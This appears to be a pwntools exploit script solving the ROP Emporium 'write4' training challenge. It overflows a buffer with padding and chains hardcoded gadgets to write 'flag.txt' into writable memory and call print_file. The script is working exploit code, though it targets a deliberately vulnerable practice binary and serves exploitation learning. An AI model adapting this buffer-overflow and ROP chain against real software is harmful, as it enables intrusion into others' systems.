#!/usr/bin/env python3
#

import sys
from pwn import *
from threading import Thread


libc = elf = None


gs = '''
tb pwnme+152
continue
'''
def start():
    if args.DEBUG:
        context.log_level = 'debug'

    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)


def send(data):
    io.send(data)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target binary> [GDB] [NOASLR] [DEBUG]")
        exit(1)

    elf = context.binary = ELF(sys.argv[1])

    io = start()
    io.recvuntil(b"> ")
    io.timeout = 0.1

    ### attack
    garbage = b"A"*40

    # mov dword ptr [rsi], edi; ret;
    set_rsi_gadget = p64(0x0000000000400629)
    pop_rdi_gadget = p64(0x0000000000400693)
    pop_rsi_r15_gadget = p64(0x0000000000400691)
    pop_rdi_gadget = p64(0x0000000000400693)
    ret_gadget = p64(0x00000000004004e6)
    # 0x601000           0x602000 rw-p     1000   1000 /home/adrian/RopEmperium/write4/write4
    rw_mem = p64(0x0000000000601230)
    rw_mem2 = p64(0x0000000000601234) # offset 4

    rop = b""
    rop += pop_rsi_r15_gadget
    rop += rw_mem
    rop += p64(0xdeadbeef) # garbage for r15
    rop += pop_rdi_gadget
    rop += b"flag" + b"\x00"*4
    rop += set_rsi_gadget

    rop += pop_rsi_r15_gadget
    rop += rw_mem2
    rop += p64(0xdeadbeef) # garbage for r15
    rop += pop_rdi_gadget
    rop += b".txt" + b"\x00"*4
    rop += set_rsi_gadget

    rop += pop_rdi_gadget
    rop += rw_mem

    rop += ret_gadget # align stack
    rop += p64(elf.plt['print_file'])

    payload = garbage + rop
    send(payload)

    ### shell
    io.interactive()
